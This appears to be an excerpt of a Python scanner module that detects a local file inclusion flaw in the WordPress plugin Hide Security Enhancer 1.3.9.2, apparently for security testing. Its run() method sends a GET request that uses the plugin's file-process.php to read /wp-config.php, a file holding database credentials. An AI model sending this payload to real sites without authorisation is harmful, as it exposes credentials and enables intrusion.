#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Hide Security Enhancer version 1."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion detected",
